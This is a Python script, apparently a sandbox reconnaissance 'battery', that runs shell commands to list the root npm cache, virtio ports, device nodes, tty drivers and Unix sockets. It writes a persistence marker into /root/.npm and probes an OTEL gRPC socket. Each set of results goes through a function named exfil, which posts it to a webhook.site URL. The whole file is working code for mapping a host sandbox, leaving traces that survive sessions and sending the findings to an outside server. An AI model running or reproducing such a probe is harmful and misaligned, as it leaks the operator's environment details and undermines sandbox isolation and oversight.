#!/usr/bin/env python3
"""Lane C battery 4: OTEL gRPC probe + virtio-ports + cache marker persistence."""
import socket, struct, subprocess, time, os, sys, json, urllib.request

TOKEN = "31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W = "https://webhook.site/" + TOKEN
CAP = 60000

def exfil(label, data):
    data = str(data)[:CAP]
    for attempt in range(3):
        try:
            req = urllib.request.Request(W, data=("###%s### %s" % (label, data)).encode(),
                                         headers={"Content-Type": "text/plain"})
            urllib.request.urlopen(req, timeout=25)
            return
        except Exception as e:
            sys.stderr.write("exfil fail %s: %s\n" % (label, e))
            time.sleep(1)

def run(cmd, timeout=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR %s" % e

# F0: cache marker persistence + write new marker
f0 = []
f0.append("=== /root/.npm now ===\n" + run("ls -la /root/.npm/ /root/.npm/_logs 2>&1"))
try:
    open("/root/.npm/LANEC-MARKER-b4", "w").write("b4 %s" % time.time())
    f0.append("marker b4 written")
except Exception as e:
    f0.append("marker b4 fail: %s" % e)
f0.append("=== npm tree ===\n" + run("find /root/.npm -maxdepth 3 2>&1 | head -50"))
f0.append("=== mountinfo npm ===\n" + run("grep -E 'npm|otel' /proc/self/mountinfo"))
exfil("F0-cache", "\n".join(f0))

# F1: virtio-ports / console channels
f1 = []
f1.append("=== /sys/class/virtio-ports ===\n" + run("ls -la /sys/class/virtio-ports/ 2>&1"))
f1.append("=== virtio0 ports ===\n" + run("ls -laR /sys/bus/virtio/devices/virtio0/ 2>&1 | head -60"))
f1.append("=== /dev/misc ===\n" + run("ls -la /dev/ 2>&1"))
f1.append("=== hvc ===\n" + run("ls -la /sys/class/tty/ 2>&1 | grep -i hvc; cat /proc/tty/drivers 2>&1 | head"))
exfil("F1-vports", "\n".join(f1))

# F2: node OTEL probe
f2 = run("node ./otel_probe.js 2>&1", timeout=120)
exfil("F2-otel-grpc", f2)

# F3: socket inode + stat details, try reading /proc/net/unix now
f3 = []
f3.append("=== stat otel sock ===\n" + run("stat /dev/otel-grpc.sock 2>&1"))
f3.append("=== /proc/net/unix ===\n" + run("cat /proc/net/unix 2>&1 | head -20"))
f3.append("=== our unix conns ===\n" + run("python3 -c \"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/dev/otel-grpc.sock'); print('connected'); import time; time.sleep(2)\" 2>&1; cat /proc/net/unix 2>&1 | head -10"))
exfil("F3-sockstat", "\n".join(f3))

print("battery4 done")
